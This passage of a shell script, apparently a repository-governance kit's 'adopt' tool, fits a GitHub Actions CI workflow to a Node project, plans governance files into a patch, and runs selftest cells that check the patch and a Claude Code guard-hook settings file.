  printf '%s' "$DATE" | grep -Eq '^[0-9]{4}-[0-9]{2}-[0-9]{2}$' || die1 "the date could not be read; nothing was written"
  ALREADY_EXTRA=" and every brownfield area (required checks, waiver register, tracker files, workflows, CI, code owners) is present, kept, refused or skipped (a refused or skipped area is listed below)"
}

# --- the fitted ci.yml (design 5): step blocks keyed by id, never a YAML rewrite; typescript-node with npm only ---
ci_note() { CI_N=$((CI_N + 1)); rec ci-n "  $CI_N. $1"; }
drop_blk() { DROP="$DROP$1 "; }
has_script() { grep -qxF -- "$1" "$T/scripts"; }   # MUT-ALLSCRIPTS
blk_id() { sed -n 's/^        id: \(gate-[a-z0-9-]*\)[[:space:]]*$/\1/p' "$1" | head -n 1; }
fit_split() {  # <profile ci.yml>: $T/fit/head (to the ci job's steps:), blk.N (one step each, its leading comment lines with it), rest (the next job on), nblk
  mkdir -p "$T/fit"
  awk -v d="$T/fit" '
    function closeblk() { n++; printf "%s", cur > (d "/blk." n); close(d "/blk." n); cur = ""; hasstep = 0 }
    BEGIN { n = 0; mode = 0; hasstep = 0; tail = ""; cur = "" }
    mode == 0 { print > (d "/head"); if ($0 ~ /^    steps:[ ]*$/) mode = 1; next }
    mode == 1 && /^  [^ ]/ { cur = cur tail; tail = ""; if (cur != "") closeblk(); mode = 2; print > (d "/rest"); next }
    mode == 1 && /^      #/ { tail = tail $0 "\n"; next }
    mode == 1 && /^[ \t]*$/ { cur = cur tail $0 "\n"; tail = ""; next }
    mode == 1 && /^      - / { if (hasstep) closeblk(); cur = cur tail $0 "\n"; tail = ""; hasstep = 1; next }
    mode == 1 { cur = cur tail $0 "\n"; tail = ""; next }
    mode == 2 { print > (d "/rest") }
    END { printf "%d\n", n > (d "/nblk") }' "$1"
  [ -f "$T/fit/rest" ] || : > "$T/fit/rest"
}
fit_classify() {  # N_* = the number of each block the fitter acts on (0 = none)
  N_CO=0; N_SC=0; N_ST=0; N_IN=0; N_LI=0; N_TY=0; N_TE=0; N_BU=0; N_UP=0; N_NO=0
  _i=1
  while [ "$_i" -le "$FIT_NB" ]; do
    _b="$T/fit/blk.$_i"
    if [ "$N_CO" -eq 0 ] && grep -q '^      - uses: actions/checkout@' "$_b"; then N_CO=$_i; fi
    if [ "$N_ST" -eq 0 ] && grep -q '^      - uses: actions/setup-node@' "$_b"; then N_ST=$_i; fi
    if grep -q '^      - name: Upload build artifact (for provenance)' "$_b"; then N_UP=$_i; fi
    if grep -q '^      - name: Build provenance skipped (notice)' "$_b"; then N_NO=$_i; fi
    case "$(blk_id "$_b")" in
      gate-secret-scan) N_SC=$_i ;;
      gate-install) N_IN=$_i ;;
      gate-lint) N_LI=$_i ;;
      gate-type-check) N_TY=$_i ;;
      gate-test) N_TE=$_i ;;
      gate-build) N_BU=$_i ;;
    esac
    _i=$((_i + 1))
  done
}
fit_lock() {  # no npm lockfile: npm install, and setup-node's npm cache (which needs one) goes
  if [ -f "$T/base/package-lock.json" ] || [ -f "$T/base/npm-shrinkwrap.json" ]; then return 0; fi   # MUT-ALWAYSCI
  if [ "$N_ST" -ne 0 ]; then sedi '/^          cache: npm[[:space:]]*$/d' "$T/fit/blk.$N_ST"; fi
  sedi 's/^        run: npm ci[[:space:]]*$/        run: npm install/' "$T/fit/blk.$N_IN"
  ci_note "no lockfile: npm install, and the setup-node npm cache line removed"
}
fit_gate_scripts() {  # lint, type-check and test follow the scripts package.json really has
  D_LINT=apply; D_TYPE=apply; D_TEST=apply
  if ! has_script lint; then drop_blk "$N_LI"; D_LINT=na; ci_note "lint: dropped (no \"lint\" script) -> gate-lint na"; fi
  if ! has_script type-check; then drop_blk "$N_TY"; D_TYPE=na; ci_note "type-check: dropped (no \"type-check\" script) -> gate-type-check na"; fi
  if has_script test:coverage; then
    :
  elif has_script test; then
    sedi 's/^        run: npm run test:coverage.*$/        run: npm test/' "$T/fit/blk.$N_TE"
    ci_note "test: npm test (no \"test:coverage\" script); the step keeps its id"
  else
    drop_blk "$N_TE"; D_TEST=na; ci_note "test: dropped (no \"test\" or \"test:coverage\" script) -> gate-test na"
  fi
}
pack_ok() { jq -e '(.name | type == "string" and length > 0) and (.version | type == "string" and length > 0) and ((.private // false) != true)' "$T/base/package.json" >/dev/null 2>&1; }
fit_build() {  # rule 5a: the build artifact, its notice and the provenance job follow the build
  D_BUILD=apply; D_PROV=apply; DROP_PROV=0
  if has_script build; then
    ci_note "the artifact upload expects dist/** from npm run build; a build that writes elsewhere reds the first push to main, so edit that path"
    return 0
  fi
  if pack_ok; then
    sedi 's/^        run: npm run build[[:space:]]*$/        run: npm pack --pack-destination pack/' "$T/fit/blk.$N_BU"
    if [ "$N_UP" -ne 0 ]; then sedi 's/^          path: dist\/\*\*.*$/          path: pack\/*.tgz/' "$T/fit/blk.$N_UP"; fi
    ci_note "build: npm pack --pack-destination pack (no \"build\" script, and the package has a name and a version); the upload path is pack/*.tgz"
    return 0
  fi
  drop_blk "$N_BU"; D_BUILD=na; D_PROV=na; DROP_PROV=1   # MUT-KEEPUPLOAD
  if [ "$N_UP" -ne 0 ]; then drop_blk "$N_UP"; fi   # MUT-KEEPUPLOAD
  if [ "$N_NO" -ne 0 ]; then drop_blk "$N_NO"; fi
  ci_note "build: dropped (no \"build\" script, and the package is private or has no name or version) -> gate-build na; the artifact upload, its notice and the provenance job dropped -> gate-provenance na"
}
drop_prov_job() {  # stdin -> stdout: the top-level provenance job and its leading comment block removed; the next job on stays
  awk '
    /^  provenance:[ ]*$/ { skip = 1; buf = ""; next }
    skip == 1 && /^  [^ #]/ { skip = 0 }
    skip == 1 { next }
    /^  #/ { buf = buf $0 "\n"; next }
    { printf "%s", buf; buf = ""; print }
    END { printf "%s", buf }'
}
fit_assemble() {  # head, the checkout, the secret scan, then every other kept block in order, then the rest
  {
    cat "$T/fit/head" "$T/fit/blk.$N_CO" "$T/fit/blk.$N_SC"   # MUT-SCANFIRST
    _i=1
    while [ "$_i" -le "$FIT_NB" ]; do
      if [ "$_i" -ne "$N_CO" ] && [ "$_i" -ne "$N_SC" ]; then   # MUT-SCANFIRST
        case "$DROP" in
          *" $_i "*) : ;;
          *) cat "$T/fit/blk.$_i" ;;
        esac
      fi
      _i=$((_i + 1))
    done
    if [ "$DROP_PROV" -eq 1 ]; then drop_prov_job < "$T/fit/rest"; else cat "$T/fit/rest"; fi
  } > "$T/fit/ci.yml"
}
disp_line() {  # <id> <apply|na> <reason>: one line of the dispositions file; an na line is also a summary record
  _dk=$2   # MUT-NODISP
  printf '%s\t%s\t%s\n' "$1" "$_dk" "$3 (sparkwright adopt, $DATE)"
  if [ "$2" = na ]; then printf '%s\t%s\n' disp-n "  $1 na $3" >> "$T/fit/disp.rec"; fi
}
fit_dispositions() {  # all eight ids, each once; gate-secret-scan, gate-dep-scan and gate-sbom are always apply (D-241110-1); the summary records wait in $T/fit/disp.rec until area D is decided
  printf '%s\t%s\n' dispositions "conformance/gate-dispositions.txt: new. You accept each line by applying it (every id not listed here is apply):" > "$T/fit/disp.rec"
  {
    printf '%s\n' "# Proposed by sparkwright adopt on $DATE. One line per gate id: gate-<id><TAB>apply|na<TAB><reason>. An na line needs a reason; applying the patch accepts every line."
    disp_line gate-lint "$D_LINT" 'no "lint" script in package.json'
    disp_line gate-type-check "$D_TYPE" 'no "type-check" script in package.json'
    disp_line gate-test "$D_TEST" 'no "test" or "test:coverage" script in package.json'
    disp_line gate-build "$D_BUILD" 'no "build" script in package.json, and the package is private or has no name or version'
    disp_line gate-secret-scan apply 'kept, first after the checkout'   # MUT-SECRETNA
    disp_line gate-dep-scan apply 'kept as the profile has it'
    disp_line gate-sbom apply 'kept as the profile has it'
    disp_line gate-provenance "$D_PROV" 'no build artifact to attest'
  } > "$T/fit/disp"
}
fit_ci() {  # sets CI_WHY when the profile is not recognised; else $T/fit/ci.yml and $T/fit/disp, and the summary records
  CI_N=0; DROP=" "
  fit_split "$ROOT/profiles/$STACK/ci.yml"
  FIT_NB=$(cat "$T/fit/nblk")
  fit_classify
  if [ "$N_CO" -eq 0 ] || [ "$N_SC" -eq 0 ] || [ "$N_IN" -eq 0 ] || [ "$N_LI" -eq 0 ] || [ "$N_TY" -eq 0 ] || [ "$N_TE" -eq 0 ] || [ "$N_BU" -eq 0 ]; then
    CI_WHY="refused: the profile's step layout was not recognised (a damaged kit copy, or a profile edit the fitter does not know); merge profiles/$STACK/ci.yml by hand"
    return 0
  fi
  ci_note "secret scan moved first, right after the checkout (the profile ran it last, so a failed install hid it)"
  fit_lock; fit_gate_scripts; fit_build; fit_assemble
  if [ "$D_PROV" = apply ]; then ci_note "the provenance job stays; if your repository is private and the job skips, add a dated na line for gate-provenance to conformance/gate-dispositions.txt"; fi
  if [ "$DB" -eq 0 ] && grep -q '# >>> kit:db-backed' "$T/fit/ci.yml"; then
    strip_db_region "$T/fit/ci.yml"; ci_note "the kit:db-backed region removed (no --db)"
  fi
  pipeline_origin_stamp "$T/fit/ci.yml"
  fit_dispositions
}
plan_ci() {  # area C: refused (a reason) or proposed; A_C=1 only with a fitted file
  CI_WHY=""
  if [ "$STACK" != typescript-node ]; then
    CI_WHY="no fitted pipeline for the $STACK stack in this release; merge profiles/$STACK/ci.yml by hand (docs/adoption/brownfield.md)"
  elif [ ! -f "$T/base/package.json" ]; then
    CI_WHY="refused: no package.json at the repository root"
  elif ! json_strict_ok "$T/base/package.json"; then
    CI_WHY="refused: package.json is not strict JSON"
  elif [ ! -f "$T/base/package-lock.json" ] && [ ! -f "$T/base/npm-shrinkwrap.json" ] && { [ -f "$T/base/yarn.lock" ] || [ -f "$T/base/pnpm-lock.yaml" ]; }; then
    CI_WHY="refused: a yarn.lock or pnpm-lock.yaml is present and v1 fits npm only; merge profiles/typescript-node/ci.yml by hand"
  elif [ ! -f "$ROOT/profiles/$STACK/ci.yml" ]; then
    CI_WHY="refused: the kit has no profiles/$STACK/ci.yml"
  else
    jq -r '(.scripts // {}) | if type == "object" then keys[] | select(test("^[A-Za-z0-9:._-]+$")) else empty end' "$T/base/package.json" > "$T/scripts" || CI_WHY="refused: package.json scripts could not be read"
    if [ -z "$CI_WHY" ]; then fit_ci; fi
  fi
  if [ -n "$CI_WHY" ]; then rec ci "$CI_WHY"; return 0; fi
  A_C=1
  rec ci ".github/workflows/ci.yml: new, fitted to this repository (the changes from the profile are listed below)"
}

# --- planning every area: absent-only decisions and their records; compose_areas writes the files ---
plan_kept_workflows() {  # the adopter's other workflows are named, never read
  for _wf in "$TROOT"/.github/workflows/*; do
    [ -f "$_wf" ] || continue
    _bn=$(basename "$_wf")
    case "$_bn" in
      *[!A-Za-z0-9._-]*|ci.yml|ratification.yml|adopter-gates.yml|adopter-tracker-gates.yml|adopter-trunk-trace.yml|solo-go.yml) continue ;;
    esac
    rec kept ".github/workflows/$_bn: yours, not in this patch"
  done
}
plan_area_files() {  # areas R, W, T, J and S
  if [ -e "$T/base/REQUIRED-CHECKS.md" ]; then rec kept "REQUIRED-CHECKS.md: yours, not in this patch"; else need_kit_file templates/REQUIRED-CHECKS-TEMPLATE.md; A_R=1; fi
  if [ -e "$T/base/WAIVER-REGISTER.md" ]; then
    rec kept "WAIVER-REGISTER.md: yours, not in this patch"
  else
    need_kit_file templates/WAIVER-REGISTER.md; A_W=1
    rec waivers "WAIVER-REGISTER.md: new and EMPTY (the kit's template, sha256 $(sha256 "$ROOT/templates/WAIVER-REGISTER.md")); the rows the kit proposes are under NOTES, and a person writes them"
  fi
  if [ "$BACKLOG" = jira ]; then
    _smap=identity; if [ "$EXISTING" -eq 1 ]; then _smap="left empty (--existing)"; fi
    if [ -e "$T/base/.kit/tracker.conf" ]; then rec kept ".kit/tracker.conf: yours, not in this patch"; else A_T=1; rec tracker ".kit/tracker.conf: new (jira; base_url and project as given, else the placeholders; state map $_smap)"; fi
    if [ -e "$T/base/JIRA-SETUP.md" ]; then rec kept "JIRA-SETUP.md: yours, not in this patch"; else need_kit_file templates/JIRA-SETUP-TEMPLATE.md; A_J=1; rec tracker "JIRA-SETUP.md: new"; fi
  fi
  if [ "$TEAM" = solo ]; then
    if [ -e "$T/base/.kit/dials.conf" ]; then rec kept ".kit/dials.conf: yours, not in this patch"; else A_S=1; rec solo ".kit/dials.conf: new, MERGE_RELATIONSHIP=solo"; fi
  fi
}
plan_area_ci_files() {  # areas K, C, D and O: GitHub only
  for _w in $WF_KIT; do
    if [ -e "$T/base/.github/workflows/$_w.yml" ]; then
      rec kept ".github/workflows/$_w.yml: yours, not in this patch"
    else
      need_kit_file "profiles/$_w.yml"; A_K="$A_K $_w"
      rec workflows ".github/workflows/$_w.yml: new, the kit's copy byte for byte (sha256 $(sha256 "$ROOT/profiles/$_w.yml"))"
    fi
  done
  if [ -e "$T/base/.github/workflows/ci.yml" ]; then rec kept ".github/workflows/ci.yml: yours, not in this patch"; else plan_ci; fi   # MUT-CLOBBER
  if [ "$A_C" -eq 1 ]; then
    if [ -e "$T/base/conformance/gate-dispositions.txt" ]; then
      rec kept "conformance/gate-dispositions.txt: yours, not in this patch"
      rec dispositions "the fitted ci.yml's dropped gates are judged against your own conformance/gate-dispositions.txt: it needs an na line, with a reason, for each gate the numbered changes above drop"
    else
      A_D=1; cat "$T/fit/disp.rec" >> "$T/rec"
    fi
  fi
  _have=0
  for _c in .github/CODEOWNERS CODEOWNERS docs/CODEOWNERS; do   # MUT-OWNERSDIR
    if [ -e "$T/base/$_c" ]; then _have=1; rec kept "$_c: yours, not in this patch"; fi
  done
  if [ "$_have" -eq 0 ]; then
    if [ -f "$ROOT/profiles/$STACK/CODEOWNERS" ]; then
      A_O=1; _seed=$(codeowners_seed_handle "$OWNER")
      if [ -n "$_seed" ]; then rec owners ".github/CODEOWNERS: new, every rule commented out; seeded with $_seed"; else rec owners ".github/CODEOWNERS: new, every rule commented out"; fi
    else
      rec skipped "no profiles/$STACK/CODEOWNERS in this kit: .github/CODEOWNERS is not proposed"
    fi
  fi
  plan_kept_workflows
}
plan_area_checks() {  # area R's record: the contexts it declares follow area C and the backlog
  R_CI="# ci                     <- uncomment once you add a CI workflow whose job key is ci"; R_LIST="control-plane-ratification, backlog-presence, ceremony-binding, loop-state"
  if [ "$A_C" -eq 1 ]; then R_CI=ci; R_LIST="ci, $R_LIST"; fi   # MUT-CIALWAYS
  R_TBG=""; R_SOLO=""
  if [ "$BACKLOG" = jira ]; then R_TBG=tracker-board-gates; R_LIST="$R_LIST, tracker-board-gates"; fi
  if [ "$TEAM" = solo ]; then R_SOLO=solo-go-bound; R_LIST="$R_LIST, solo-go-bound"; fi
  [ "$A_R" -eq 1 ] || return 0
  if [ "$CI" = gitlab ]; then
    rec checks "REQUIRED-CHECKS.md: new, the placeholder stays (its names are GitHub check contexts; the protected-branch equivalent is yours)"
  else
    rec checks "REQUIRED-CHECKS.md: new, declares $R_LIST"
  fi
}
plan_notes() {  # the proposals that are NOT in the patch: the waiver rows, what is not proposed, what is owed
  if [ "$BACKLOG" != md ]; then
    case "$BACKLOG" in
      md|github|jira|ado|linear|gitlab) : ;;
      *) die1 "the backlog backend is not a known token; nothing was written" ;;
    esac
    printf '%s' "$DATE" | grep -Eq '^[0-9]{4}-[0-9]{2}-[0-9]{2}$' || die1 "the date is not YYYY-MM-DD; nothing was written"
    _row=$(board_governance_row "$BACKLOG" "$DATE") || die1 "the board-governance row could not be composed; nothing was written"
    rec nline "Waiver rows for WAIVER-REGISTER.md, for a person to write if they apply:"
    rec nline "$_row"
  fi
  _bpe=$(date -u -d "$DATE +90 days" +%Y-%m-%d 2>/dev/null || date -u -j -v+90d -f %Y-%m-%d "$DATE" +%Y-%m-%d 2>/dev/null) || _bpe=$DATE
  rec nline "Only if your repository is private on GitHub Free (branch protection returns 403):"
  rec nline "| branch-protection-plan | Branch protection cannot be set: GitHub Free refuses it on a private repository | [owner] | $DATE | $_bpe | Make the repository public, or move to a paid plan (and declare KIT_ATTEST_PRIVATE), then delete this row | [security-owner] |"
  rec nline "Not proposed: coverage, sbom, provenance and dependency-vuln rows (your call; docs/adoption/brownfield.md section 5, the deferrable tier)"
  if [ "$BACKLOG" = jira ]; then
    rec owed "$BP_SKIP_LINE"
    rec owed "owed to you: KIT_TRACKER_USER and KIT_TRACKER_TOKEN as repository secrets (set by a person), and binding the required contexts with scripts/branch-protection-apply.sh (a human act)"; fi
}
plan_areas() {  # the brownfield areas, in incept's order; AREAS_NEW is set when any is to be written
  plan_area_files
  if [ "$CI" = github ]; then
    plan_area_ci_files
  else
    rec skipped "the workflows, the fitted CI, the dispositions and the code owners are not proposed with --ci gitlab (v1 stamps no GitLab pipeline or CODEOWNERS)"
  fi
  plan_area_checks
  plan_notes
  if [ "$A_R$A_W$A_T$A_J$A_C$A_D$A_O$A_S" != 00000000 ] || [ -n "$A_K" ]; then AREAS_NEW=yes; fi
}
compose_areas() {  # the new files, written in the work copy $T/w; the stamping functions use relative paths, so they run with that cwd
  (
    cd "$T/w" || exit 1
    mkdir -p .github/workflows .kit conformance   # MUT-PKGEDIT
    if [ "$A_R" -eq 1 ]; then
      cp "$ROOT/templates/REQUIRED-CHECKS-TEMPLATE.md" REQUIRED-CHECKS.md
      sedi "s#\[Project Name\]#$(esc "$NAME")#g" REQUIRED-CHECKS.md
      strip_template_banner REQUIRED-CHECKS.md
      if [ "$CI" = github ]; then required_checks_fill REQUIRED-CHECKS.md "$R_CI" "$R_TBG" "$R_SOLO"; fi
    fi
    if [ "$A_W" -eq 1 ]; then cp "$ROOT/templates/WAIVER-REGISTER.md" WAIVER-REGISTER.md; fi   # MUT-FILLWAIVER
    if [ "$A_T" -eq 1 ]; then tracker_conf_write .kit/tracker.conf "$EXISTING" "$TURL" "$TPROJ"; fi
    if [ "$A_J" -eq 1 ]; then
      cp "$ROOT/templates/JIRA-SETUP-TEMPLATE.md" JIRA-SETUP.md
      sedi "s#\[Project Name\]#$(esc "$NAME")#g" JIRA-SETUP.md
      strip_template_banner JIRA-SETUP.md
    fi
    for _w in $A_K; do cp "$ROOT/profiles/$_w.yml" ".github/workflows/$_w.yml"; done   # MUT-WFBYTE
    if [ "$A_C" -eq 1 ]; then cp "$T/fit/ci.yml" .github/workflows/ci.yml; fi   # MUT-TOUCHKIT
    if [ "$A_D" -eq 1 ]; then cp "$T/fit/disp" conformance/gate-dispositions.txt; fi
    if [ "$A_O" -eq 1 ]; then
      cp "$ROOT/profiles/$STACK/CODEOWNERS" .github/CODEOWNERS
      codeowners_inert .github/CODEOWNERS "$OWNER"
    fi
    if [ "$A_S" -eq 1 ]; then printf '%s\n' "MERGE_RELATIONSHIP=solo" > .kit/dials.conf; fi
  ) || die1 "the brownfield areas could not be composed; nothing was written"
}
add_summary() {  # the summary block goes on the top of the patch; git apply ignores the text before the first diff line (the self-check proves it)
  render_summary patch > "$T/sum" || die1 "the summary could not be composed; nothing was written"   # MUT-SUMMARY
  cat "$T/sum" "$T/patch" > "$T/patch.s" && mv "$T/patch.s" "$T/patch"
}
check_summary() {  # the run-time grammar: every line before the first diff line starts with "# " (or is "#"), none reads as a diff line, none holds a control byte
  awk '/^diff --git /{exit} !/^#( |$)/{bad=1} {l=$0; sub(/^# ?/, "", l); if (l ~ /^(diff |--- |\+\+\+ |@@ |index )/) bad=1} END{exit bad+0}' "$T/patch" \
    || die1 "the summary block breaks its grammar (a line without its hash, or one that reads as a diff line); nothing was written"
  _sn=$(wc -l < "$T/sum" | tr -d ' ')
  head -n "$_sn" "$T/patch" | cmp -s - "$T/sum" || die1 "the patch does not open with the summary block just composed; nothing was written"
  awk '/^diff --git /{exit} {print}' "$T/patch" > "$T/sum.chk"
  cmp -s "$T/sum.chk" "$T/sum" || die1 "the text before the first diff line is not the summary block just composed (an injected line); nothing was written"
  [ -z "$(LC_ALL=C tr -d '\011\012\040-\176\200-\377' < "$T/sum.chk")" ] || die1 "the summary block holds a control byte; nothing was written"
}

# --- the selftest: cells A1-A8 of the design (A7 is the entry-contract region, errata E1), A9-A14 and A16-A18 of SWAS-1009's design (A15 is incept's, run elsewhere), A19-A26 of SWAS-1011's design, and their mutants ---
SELFTEST_BAD=0; SELFTEST_QUIET=0; SEQ=0; OUT=""; RC=0; ARUN_TMP=""
ARUN_EXTRA=""; CHK_TAG=""; PKGJSON=""; PKGLOCK=0   # ARUN_EXTRA: a flag every arun appends (A18: --guard-only); CHK_TAG: a prefix on every cell line (A18); PKGJSON, PKGLOCK: the fixture package.json text and a lockfile switch
FULLF="--team solo --backlog jira --tracker-url https://example.atlassian.net --tracker-project EXMP --owner @example-owner --name example-app"   # the flags of a full brownfield run; no value holds a space
chk() {  # <0 ok | 1 bad> <message>
  if [ "$1" -eq 0 ]; then
    [ "$SELFTEST_QUIET" -eq 1 ] || echo "PASS: $CHK_TAG$2"
  else
    SELFTEST_BAD=$((SELFTEST_BAD + 1))
    [ "$SELFTEST_QUIET" -eq 1 ] || echo "FAIL: $CHK_TAG$2"
  fi
}
has() { case "$OUT" in *"$1"*) chk 0 "$2" ;; *) chk 1 "$2 (missing: $1)" ;; esac; }
hasnt() { case "$OUT" in *"$1"*) chk 1 "$2 (found: $1)" ;; *) chk 0 "$2" ;; esac; }
show_out() { [ "$SELFTEST_QUIET" -eq 1 ] || printf '%s\n' "$OUT" | head -n 15 | tr -d '\000-\010\013-\037\177' | sed 's/^/    | /'; }
rc_is() { if [ "$RC" -eq "$1" ]; then chk 0 "$2"; else chk 1 "$2 (rc $RC, wanted $1)"; show_out; fi; }
g() { git -c user.name=adopt-selftest -c user.email=adopt-selftest@invalid -c commit.gpgsign=false -c init.defaultBranch=main -c core.hooksPath=/dev/null "$@"; }
exists() { if [ -e "$1" ]; then chk 0 "$2"; else chk 1 "$2 (absent: $1)"; fi; }
absent() { if [ -e "$1" ]; then chk 1 "$2 (present: $1)"; else chk 0 "$2"; fi; }
file_has() { if grep -qF -- "$2" "$1" 2>/dev/null; then chk 0 "$3"; else chk 1 "$3 (missing: $2)"; fi; }
file_lacks() { if grep -qF -- "$2" "$1" 2>/dev/null; then chk 1 "$3 (found: $2)"; else chk 0 "$3"; fi; }

mk_kit() { SEQ=$((SEQ + 1)); KITDIR="$W/kit$SEQ"; cp -Rp "$KIT0" "$KITDIR"; }
mk_repo() {  # -> TGT (a committed repository), OUTD (an empty directory for --out), P (the patch path in it)
  SEQ=$((SEQ + 1)); TGT="$W/t$SEQ"; OUTD="$W/o$SEQ"; P="$OUTD/p.patch"; mkdir -p "$TGT" "$OUTD"
  g init -q "$TGT"; printf 'EXAMPLE_VALUE\n' > "$TGT/README.md"
  g -C "$TGT" add -A; g -C "$TGT" commit -qm base
}
commit_all() { g -C "$1" add -A -f; g -C "$1" commit -qm "$2"; }
arun() {  # <kit> args... -> OUT, RC, in a scrubbed env: a settled HOME, no ambient git config, a placeholder token, gh and curl stubs first on PATH
  _ak=$1; shift
  OUT=$(env -u CI -u GITHUB_ACTIONS -u GIT_DIR -u GIT_WORK_TREE -u GIT_INDEX_FILE HOME="$W/home" GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null GH_TOKEN=EXAMPLE_TOKEN_PLACEHOLDER PATH="$W/stubs:$PATH" ${ARUN_TMP:+"TMPDIR=$ARUN_TMP"} sh "$_ak/scripts/adopt.sh" "$@" ${ARUN_EXTRA:-} 2>&1) && RC=0 || RC=$?
}
snap() {  # every file's checksum, every directory and link, and git's view of the tree, ignored files included (.git itself is left out)
  ( cd "$1" && find . -path ./.git -prune -o -type f -print | LC_ALL=C sort | while IFS= read -r _sf; do cksum "$_sf"; done
    find . -path ./.git -prune -o \( -type d -o -type l \) -print | LC_ALL=C sort
    g status --porcelain --ignored )
}
refused() {  # <label> <needle>: the last run exited 2, named its cause and wrote no file (neither the patch nor its PR body)
  rc_is 2 "$1 exits 2"
  [ -z "$2" ] || has "$2" "$1 names its cause"
  absent "$P" "$1 wrote no file"
  absent "$P.pr.md" "$1 wrote no PR body"
}
mk_kit_settings() {  # <file>: the fixture kit's own settings, synthetic, with two extra Edit entries that must never reach a patch
  jq -n --arg c "$CANON" --arg m "$KMATCH" '{permissions: {deny: ["Edit(/.claude/**)", "Edit(/hooks/**)", "Edit(/.kit/**)", "Edit(/.git/hooks/**)", "Edit(/EXAMPLE_VALUE/**)"]},
    hooks: {PreToolUse: [{matcher: $m, hooks: [{type: "command", command: $c}]}]}}' > "$1"
}

cell_a1() {  # a single mode-600 patch outside the target; nothing inside the target changes
  mk_repo; mkdir -p "$TGT/EXAMPLE_DIR"; printf 'EXAMPLE_VALUE\n' > "$TGT/EXAMPLE_DIR/untracked.txt"
  printf 'ignored/\n' > "$TGT/.gitignore"; commit_all "$TGT" ign; mkdir -p "$TGT/ignored"; printf 'EXAMPLE_VALUE\n' > "$TGT/ignored/f.txt"
  snap "$TGT" > "$W/snap.before"
  arun "$1" "$TGT" --out "$P"
  rc_is 0 "A1 the verb exits 0"
  has "Patch written: " "A1 the output names the patch path"
  has "/p.patch" "A1 the named path is the one asked for"
  snap "$TGT" > "$W/snap.after"
  if cmp -s "$W/snap.before" "$W/snap.after"; then chk 0 "A1 the target is byte-for-byte unchanged (tracked, untracked and ignored)"; else chk 1 "A1 the target is byte-for-byte unchanged (tracked, untracked and ignored)"; fi
  if [ "$(ls -A "$OUTD" | wc -l | tr -d ' ')" = 2 ]; then chk 0 "A1 exactly two files exist at --out (the patch and its PR body)"; else chk 1 "A1 exactly two files exist at --out (the patch and its PR body)"; fi
  if [ "$(ls -ld "$P" 2>/dev/null | cut -c1-10)" = "-rw-------" ]; then chk 0 "A1 the patch is mode 600"; else chk 1 "A1 the patch is mode 600"; fi
  if g -C "$TGT" apply --whitespace=nowarn --check "$P" >/dev/null 2>&1; then chk 0 "A1 git apply --check takes the patch at the repository root"; else chk 1 "A1 git apply --check takes the patch at the repository root"; fi
  file_has "$P" "new file mode 100755" "A1 the guard scripts are new files with mode 755"
  file_has "$P" "+.kit-run/" "A1 .gitignore gains .kit-run/"
}

a2_case() {  # <kit> <label> <settings text> <jq -e assertion on the applied settings> [untracked]
  _k=$1; _l=$2; mk_repo; mkdir -p "$TGT/.claude"; printf '%s\n' "$3" > "$TGT/.claude/settings.json"
  [ "${5:-}" = untracked ] || commit_all "$TGT" cfg
  arun "$_k" "$TGT" --out "$P"
  rc_is 0 "A2 $_l: the verb exits 0"
  [ "$RC" -eq 0 ] || return 0
  if g -C "$TGT" apply --whitespace=nowarn "$P" >/dev/null 2>&1; then chk 0 "A2 $_l: git apply takes the patch"; else chk 1 "A2 $_l: git apply takes the patch"; return 0; fi
  _o=$(sh "$_k/conformance/guard-wired.sh" --rung1-only "$TGT" 2>&1) && _r=0 || _r=$?
  case "$_o" in *"WARN:"*) _r=9 ;; esac
  if [ "$_r" -eq 0 ]; then chk 0 "A2 $_l: guard-wired --rung1-only is clean after the apply"; else chk 1 "A2 $_l: guard-wired --rung1-only is clean after the apply"; fi
  if jq -e --arg c "$CANON" --arg m "$KMATCH" "$4" "$TGT/.claude/settings.json" >/dev/null 2>&1; then chk 0 "A2 $_l: the settings are as designed"; else chk 1 "A2 $_l: the settings are as designed"; fi
  if jq -e --arg c "$CANON" 'all(.. | objects | select(has("command")) | .command; . == $c or (test("guard\\.sh") | not))' "$TGT/.claude/settings.json" >/dev/null 2>&1; then chk 0 "A2 $_l: no guard command but the canonical one"; else chk 1 "A2 $_l: no guard command but the canonical one"; fi
}
cell_a2() {
  _g='{"type":"command","command":"sh .claude/hooks/guard.sh"}'; _h='{"type":"command","command":"sh my-hook.sh"}'
  a2_case "$1" "no hooks key" '{"model":"EXAMPLE_VALUE"}' '.model == "EXAMPLE_VALUE" and (.hooks.PreToolUse | length) == 1 and .hooks.PreToolUse[0].matcher == $m and .hooks.PreToolUse[0].hooks[0].command == $c'
  a2_case "$1" "the adopter's own PreToolUse hook" "{\"hooks\":{\"PreToolUse\":[{\"matcher\":\"Bash\",\"hooks\":[$_h]}]}}" '(.hooks.PreToolUse | length) == 2 and .hooks.PreToolUse[0].matcher == "Bash" and .hooks.PreToolUse[0].hooks[0].command == "sh my-hook.sh" and .hooks.PreToolUse[1].matcher == $m'
  a2_case "$1" "a guard entry shared with the adopter's hook under a narrower matcher" "{\"hooks\":{\"PreToolUse\":[{\"matcher\":\"Bash\",\"hooks\":[$_h,$_g]}]}}" '(.hooks.PreToolUse | length) == 2 and .hooks.PreToolUse[0].matcher == "Bash" and (.hooks.PreToolUse[0].hooks | length) == 1 and .hooks.PreToolUse[0].hooks[0].command == "sh my-hook.sh" and .hooks.PreToolUse[1].matcher == $m and .hooks.PreToolUse[1].hooks[0].command == $c'
  a2_case "$1" "an element holding only a guard entry under a non-kit matcher" "{\"hooks\":{\"PreToolUse\":[{\"matcher\":\"Bash\",\"hooks\":[$_g]}]}}" '(.hooks.PreToolUse | length) == 1 and .hooks.PreToolUse[0].matcher == $m and .hooks.PreToolUse[0].hooks[0].command == $c'
  a2_case "$1" "two guard entries" "{\"hooks\":{\"PreToolUse\":[{\"matcher\":\"Bash\",\"hooks\":[$_g]},{\"matcher\":\"Write\",\"hooks\":[{\"type\":\"command\",\"command\":\"sh ./.claude/hooks/guard.sh\"}]}]}}" '(.hooks.PreToolUse | length) == 1 and ([.hooks.PreToolUse[].hooks[] | select(.command == $c)] | length) == 1'
  a2_case "$1" "an old non-canonical command under the kit matcher" "$(jq -nc --arg m "$KMATCH" '{hooks: {PreToolUse: [{matcher: $m, hooks: [{type: "command", command: "sh .claude/hooks/guard.sh"}]}]}}')" '.hooks.PreToolUse[0].hooks[0].command == $c and (.hooks.PreToolUse | length) == 1'
